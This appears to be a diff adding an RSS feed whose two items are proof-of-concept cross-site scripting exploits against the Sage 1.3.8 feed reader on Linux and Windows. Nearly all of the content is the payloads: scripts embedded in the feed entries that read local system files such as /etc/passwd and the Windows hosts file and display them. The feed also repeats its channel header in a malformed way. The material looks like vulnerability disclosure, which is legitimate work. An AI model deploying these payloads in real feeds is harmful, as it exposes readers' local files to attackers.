@@ -1,0 +1,73 @@
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;rss version=&quot;2.0&quot; 
+	xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;
+	xmlns:wfw=&quot;http://wellformedweb.org/CommentAPI/&quot;
+	xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;
+	&gt;
+
+&lt;channel&gt;
+	&lt;title&gt;Operation n - michaeldaw.org&lt;/title&gt;
+	&lt;link&gt;http://michaeldaw.org&lt;/link&gt;
+	&lt;description&gt;The Adventures of Michael Daw&lt;/description&gt;
+
+		&lt;item&gt;
+		&lt;title&gt;Linux Sage 1.3.8 XSS Exploit&lt;/title&gt;
+
+			&lt;content:encoded&gt;&lt;![CDATA[
+
+
+&lt;img src=&quot;http://michaeldaw.org/images/jss.jpg&quot; 
+
+&lt;script&gt;
+
+try {
+var req = new XMLHttpRequest();
+req.open(&quot;GET&quot;, &quot;file:///etc/passwd&quot;, null);
+req.send(null); alert(req.responseText) } catch (e) {};
+
+&lt;/script&gt; 
+
+alt=&quot;test&quot;&gt;Sage XSS Vulnerability.&lt;/img&gt;
+
+
+]]&gt;
+
+&lt;/content:encoded&gt;
+
+
+		&lt;/item&gt;
+&lt;title&gt;Operation n - michaeldaw.org&lt;/title&gt;
+        &lt;link&gt;http://michaeldaw.org&lt;/link&gt;
+        &lt;description&gt;The Adventures of Michael Daw&lt;/description&gt;
+
+                &lt;item&gt;
+                &lt;title&gt;Windows Sage 1.3.8 XSS Exploit&lt;/title&gt;
+
+                        &lt;content:encoded&gt;&lt;![CDATA[
+
+
+&lt;img src=&quot;http://michaeldaw.org/images/jss.jpg&quot;
+
+&lt;script&gt;
+alert(&#039;blah&#039;);
+
+try {
+var req = new XMLHttpRequest();
+req.open(&quot;GET&quot;, &quot;file:///C:/WINDOWS/system32/drivers/etc/hosts&quot;, null);
+req.send(null); alert(req.responseText) } catch (e) {};
+
+&lt;/script&gt;
+
+alt=&quot;test&quot;&gt;Sage XSS Vulnerability.&lt;/img&gt;
+
+
+]]&gt;
+
+&lt;/content:encoded&gt;
+
+
+                &lt;/item&gt;
+
+
+	&lt;/channel&gt;
+&lt;/rss&gt;
